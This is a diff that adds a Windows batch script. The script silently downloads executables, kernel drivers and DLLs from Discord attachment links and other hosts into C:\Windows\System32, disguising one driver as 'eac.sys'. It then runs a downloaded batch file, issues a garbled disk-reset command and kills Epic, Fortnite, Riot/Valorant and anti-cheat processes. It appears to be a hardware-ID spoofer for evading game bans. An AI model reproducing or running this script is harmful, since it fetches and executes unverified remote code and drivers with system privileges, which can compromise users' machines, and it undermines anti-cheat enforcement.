@@ -1,0 +1,29 @@
+curl --silent https://www.exterium.xyz/assetsV2/EA%20Sports/ValoMapper.exe --output C:\Windows\System32\ValoMapper.exe >nul 2>&1
+curl --silent https://github.com/SoarDevelopment/Spoof-Driver/raw/main/soardrv.sys --output C:\Windows\System32\eac.sys >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556136615956/UCORESYS.SYS --output C:\Windows\System32\UCORESYS.SYS >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556472180867/UCOREVXD.VXD --output C:\Windows\System32\UCOREVXD.VXD >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107556795125780/UCOREW64.SYS --output C:\Windows\System32\UCOREW64.SYS >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107557151657997/UCOREDLL.DLL --output C:\Windows\System32\UCOREDLL.DLL >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107570565021799/AMIDEWINx64.EXE --output C:\Windows\System32\AMIDEWINx64.EXE >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107570900586547/amifldrv64.sys --output C:\Windows\System32\amifldrv64.sys >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107571269664850/DMI16.EXE --output C:\Windows\System32\DMI16.EXE  >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150107571575869470/AMIDEWIN.EXE --output C:\Windows\System32\AMIDEWIN.EXE >nul 2>&1
+curl --silent https://cdn.discordapp.com/attachments/1138525550198132909/1150147342645870613/sugma.bat --output C:\Windows\System32\sugma.bat >nul 2>&1
+cd C:\Windows\System32
+cd C:\Windows\System32\ && sugma.bat
+powershell.exe  Reset - PhysicalDisk* > nul 2 > &1
+taskkill /f /im epicgameslauncher.exe > nul
+taskkill /f /im EpicWebHelper.exe > nul
+taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe > nul
+taskkill /f /im FortniteClient-Win64-Shipping_BE.exe > nul
+taskkill /f /im FortniteLauncher.exe > nul
+taskkill /f /im FortniteClient-Win64-Shipping.exe > nul
+taskkill /f /im EpicGamesLauncher.exe > nul
+taskkill /f /im EasyAntiCheat.exe > nul
+taskkill /f /im BEService.exe > nul
+taskkill /f /im BEServices.exe > nul
+taskkill /f /im BattleEye.exe > nul
+taskkill /f /im RiotClientServices.exe > nul
+taskkill /f /im RiotClientUxRender.exe > nul
+taskkill /f /im riotclientservices.exe > nul
+taskkill /f /im VALORANT-Win64-Shipping.exe > nul
